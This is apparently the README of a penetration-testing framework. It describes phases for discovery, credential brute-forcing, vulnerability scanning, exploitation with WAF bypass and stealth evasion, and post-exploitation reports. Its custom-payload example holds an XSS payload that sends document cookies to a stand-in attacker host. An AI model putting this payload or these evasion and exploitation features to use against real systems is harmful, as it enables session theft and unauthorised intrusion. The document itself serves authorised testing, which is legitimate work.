# Athena Security Suite

> **Enterprise-grade web application security assessment framework.**
> Async, modular, stealthy. Built for authorised penetration testers and security engineers.

---

## Legal Notice

This tool is designed **exclusively for authorised security testing** of systems you own or have written permission to assess. Unauthorised use against third-party systems is illegal and unethical. By using Athena you accept full responsibility for compliance with all applicable laws.

---

## How It Works

Athena runs a multi-phase pipeline against one or more target domains. Each phase builds on the previous one:

```
                     ┌─────────────────────┐
                     │     TARGET(S)        │
                     │  domain / URL / IP   │
                     └──────────┬──────────┘
                                │
                     ┌──────────▼──────────┐
          PHASE 1    │   ASSET DISCOVERY   │
                     │  • URL crawling     │
                     │  • Subdomain enum   │
                     │  • Port scanning    │
                     │  • Tech detection   │
                     │  • Dir enumeration  │
                     │  • Secret extraction│
                     │    from JS/CSS      │
                     └──────────┬──────────┘
                                │
                     ┌──────────▼──────────┐
          PHASE 1.5  │  CREDENTIAL BRUTE   │
                     │  • Login form detect│
                     │  • Wordlist attack  │
                     │  • Intelligent gen  │
                     └──────────┬──────────┘
                                │
                     ┌──────────▼──────────┐
          PHASE 2    │ VULNERABILITY SCAN  │
                     │  • SQLi             │
                     │  • XSS              │
                     │  • Cmd injection    │
                     │  • LFI / path trav  │
                     │  • SSRF / XXE       │
                     │  • CSRF / IDOR      │
                     │  • Auth bypass      │
                     │  • Race conditions  │
                     │  • Misconfigs       │
                     └──────────┬──────────┘
                                │
                     ┌──────────▼──────────┐
          PHASE 3    │   EXPLOITATION      │
                     │  • WAF bypass       │
                     │  • Payload obfusctn │
                     │  • DB fingerprint   │
                     │  • Data extraction  │
                     │  • Exploit chaining │
                     └──────────┬──────────┘
                                │
                     ┌──────────▼──────────┐
          PHASE 4    │  REPORT + GUIDE     │
                     │  • JSON audit rep.  │
                     │  • Markdown guide   │
                     │  • Post-exploit     │
                     │    roadmap          │
                     │  • Remediation plan │
                     └─────────────────────┘
```

Scans can be run via **CLI** (one-off) or **REST API** (background jobs with polling).

---

## Architecture

```
athena.py                    ← CLI entry point + Flask REST API
│
├── modules/
│   ├── http_utils.py        ← Shared HTTP client (circuit breaker,
│   │                           rate limiting, stealth)
│   ├── framework_config.py  ← Centralised env-var-driven config
│   ├── logging_config.py    ← GDPR/PCI audit logger + formatters
│   ├── payload_manager.py   ← Payload registry (built-in + custom)
│   ├── discovery.py         ← Phase 1 – Asset & subdomain discovery
│   ├── vulnerability_scanner.py ← Phase 2 – Multi-vector vuln scanner
│   ├── exploitation.py      ← Phase 3 – Exploit dispatch + chaining
│   ├── bruteforce.py        ← Credential bruteforcing
│   ├── reporting.py         ← JSON/CSV/XML report generation
│   └── post_exploitation_analyzer.py ← Post-exploit roadmap
│
├── config/
│   └── payloads.json        ← WAF bypass techniques + payload templates
│
├── tests/
│   ├── conftest.py          ← Shared test fixtures
│   ├── test_config.py       ← FrameworkConfig unit tests
│   ├── test_exploitation.py ← ExploitationModule tests
│   ├── test_scanner.py      ← VulnerabilityScanner tests
│   ├── test_api.py          ← Flask API integration tests
│   └── test_logging.py      ← Audit logger + payload manager tests
│
├── docs/
│   ├── API_REFERENCE.md
│   └── USER_GUIDE.md
│
├── extension/               ← Chrome extension (UI frontend)
│
└── .github/workflows/
    └── ci.yml               ← CI pipeline
```

---

## Quick Start

### 1. Install dependencies

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

### 2. Configure environment

```powershell
Copy-Item .env.example .env
# Edit .env and set ATHENA_API_KEY to a strong random key
```

### 3. Run a scan

| Mode | Command | Pipeline |
|------|---------|----------|
| **1 – Full** | `python athena.py --target example.com --mode 1` | Discovery ➔ Bruteforce ➔ Vuln Scan ➔ Exploit ➔ Report |
| **2 – Discovery** | `python athena.py --target example.com --mode 2` | Crawl + subdomains + ports + tech + secrets |
| **3 – Scan Only** | `python athena.py --target example.com --mode 3` | Vulnerability probing only |

#### Multi-target batch
```powershell
python athena.py --target "site1.com,site2.com" --mode 1
```

#### Stealth mode
```powershell
python athena.py --target example.com --stealth --mode 1
```

#### Unsafe mode (aggressive exploitation)
```powershell
python athena.py --target example.com --unsafe --mode 1
```

### 4. Start REST API server

```powershell
python athena.py --api
# API → https://localhost:5000
# Swagger UI → https://localhost:5000/apidocs/
```

---

## CLI Reference

```powershell
python athena.py [--target TARGET] [--mode {1|2|3|4}] [--api] [--unsafe] [--stealth]
```

| Flag | Description |
|------|-------------|
| `--target` | Domain, IP, or comma-separated list |
| `--mode 1` | Full penetration test (default) |
| `--mode 2` | Asset discovery only |
| `--mode 3` | Vulnerability scanning only |
| `--mode 4` | API server mode (same as `--api`) |
| `--api` | Start headless REST API server |
| `--unsafe` | Disable safe mode for aggressive exploitation |
| `--stealth` | Max stealth: slow delays, evasive headers, UA rotation |

---

## REST API Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/health` | No | System health + active scan count |
| `GET` | `/metrics` | No | Prometheus metrics |
| `POST` | `/scan` | Yes | Queue background scan job(s) |
| `GET` | `/scan/status/{id}` | Yes | Poll job status + results |
| `POST` | `/scan/url` | Yes | Single-URL vulnerability probe |
| `GET` | `/jobs` | Yes | List all scan jobs |

### Start a scan

```bash
curl -X POST https://localhost:5000/scan \
  -H "X-API-KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"target": "example.com", "mode": "1"}' -k
```

Response includes a `job_id` for polling:
```json
{"status":"accepted","job_id":"uuid-here","poll_url":"/scan/status/uuid-here"}
```

### Poll job status

```bash
curl -H "X-API-KEY: your-api-key" \
  https://localhost:5000/scan/status/uuid-here -k
```

---

## Configuration

All settings via `.env` or environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `ATHENA_API_KEY` | *(required)* | API key for REST endpoints |
| `REQUIRE_API_KEY` | `true` | Enforce auth on all API calls |
| `SERVER_HOST` | `0.0.0.0` | API bind host |
| `SERVER_PORT` | `5000` | API bind port |
| `HTTPS_ENABLED` | `true` | Enable TLS (cert.pem + key.pem) |
| `AETHELRED_PROFILE` | `balanced` | Preset profile name |
| `AETHELRED_SAFE_MODE` | `true` | Prevent destructive exploitation |
| `MAX_TARGETS_PER_REQUEST` | `10` | Max targets per `/scan` call |
| `HTTP_TIMEOUT` | `10` | Per-request timeout (seconds) |
| `HTTP_MAX_RETRIES` | `3` | Retry attempts on failure |
| `SCANNING_THREADS` | `10` | Async concurrency limit |
| `PCI_AUDIT_ENABLED` | `true` | PCI DSS Req 10 event logging |
| `GDPR_LOGGING_ENABLED` | `true` | GDPR Art.6 access logging |
| `AUDIT_LOG_RETENTION_DAYS` | `90` | Days to retain audit logs |
| `LOG_FILE` | `aethelred.log` | Primary log file |
| `AUDIT_LOG_FILE` | `athena_audit.log` | Compliance audit log |

### Profiles

| Profile | Delays | Detection Risk | Speed |
|---------|--------|----------------|-------|
| `stealth` | 1.0–5.0s | Minimal | Slow |
| `balanced` | 0.5–2.0s | Low | Moderate |
| `aggressive` | 0.1–0.5s | Medium | Fast |
| `debug` | Variable | N/A | Variable |

---

## Security Features

- **API key auth** — mutating endpoints require `X-API-KEY` header; unconfigured keys return 503
- **Rate limiting** — 5 scans/min per key+IP, 200 calls/day default
- **Security headers** — `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, CSP, Referrer-Policy on every response
- **HTTPS** — TLS via cert.pem/key.pem, ad-hoc fallback for dev
- **Circuit breaker** — stops probing hosts that consistently fail
- **WAF detection** — identifies Cloudflare, Akamai, ModSecurity, Sucuri, Incapsula, Imperva, F5, Barracuda
- **WAF bypass** — 20+ obfuscation techniques (comment injection, Unicode, double encoding, case变异)
- **Stealth mode** — randomised UAs, noise headers, configurable jitter, IP spoofing headers
- **Thread-safe rate limiter** — `asyncio.Semaphore` across all modules

### Result Classification

| Status | Meaning | In Report |
|--------|---------|-----------|
| **CONFIRMED** | Definitive vulnerability with proof | Yes |
| **POSSIBLE** | Strong technical indicators | Yes |
| **UNLIKELY** | Weak indicators, likely false positive | No |
| **FAILED** | Inconclusive or timed out | No |

---

## Compliance Logging

JSON-L audit events are written to `athena_audit.log` (daily rotation, 90-day retention):

```json
{"event_type": "SECURITY_ACTION", "timestamp": "2026-04-19T00:00:00+00:00",
 "user": "192.168.1.1", "action": "API_SCAN_QUEUED", "target": "example.com",
 "status": "ACCEPTED", "details": "job_id=abc-123 mode=1"}
```

| Event | Method | Reference |
|-------|--------|-----------|
| Security actions | `log_action()` | General audit trail |
| Data access | `log_data_access()` | GDPR Art. 6 / Art. 30 |
| Consent records | `log_consent()` | GDPR Art. 7 |
| Scope changes | `log_scope_change()` | GDPR Art. 5 / PCI Req 10.2.5 |
| CDE access | `log_pci_event()` | PCI DSS Req 10.3 |

---

## Running Tests

```powershell
# Full suite
pytest tests/ -v

# Single file
pytest tests/test_api.py -v

# Specific test
pytest tests/test_exploitation.py::TestBruteforceAuthorization -v
```

---

## Custom Payloads

```python
from modules.payload_manager import payload_manager

# Add a custom payload at runtime
payload_manager.register_payload(
    'XSS',
    "<svg/onload=fetch('//attacker.com/?c='+document.cookie)>",
    metadata={'author': 'red-team', 'target': 'engagement-2026'},
)

# Load from JSON file
payload_manager.load_custom_payloads('my_custom_payloads.json')

# Export for audit
export = payload_manager.export_effective_payloads()
```

---

## Stealth & WAF Evasion

- **Randomised delays** — configurable jitter between requests to blend with normal traffic
- **UA rotation** — real browser agent strings from Chrome, Firefox, Safari
- **Noise headers** — `X-Forwarded-For`, `X-Real-IP`, `Client-IP`, `CF-Connecting-IP` with random IPs
- **Payload obfuscation** — case变异, URL encoding, comment injection, Unicode, base64, HTML entities
- **WAF detection** — probes response headers and body for 10+ WAF signatures

---

## Output Files

After a full scan, Athena produces:
| File | Format | Contents |
|------|--------|----------|
| `report_{target}.json` | JSON | Full audit report with executive summary, severity breakdown, remediation plan, compliance assessment |
| `guide_{target}.md` | Markdown | Manual exploitation steps for verified findings |
| `post_exploit_{target}.json` | JSON | Structured post-exploitation roadmap by phase |
| `aethelred.log` | Text | Detailed scan log |
| `athena_audit.log` | JSON-L | Compliance audit trail |
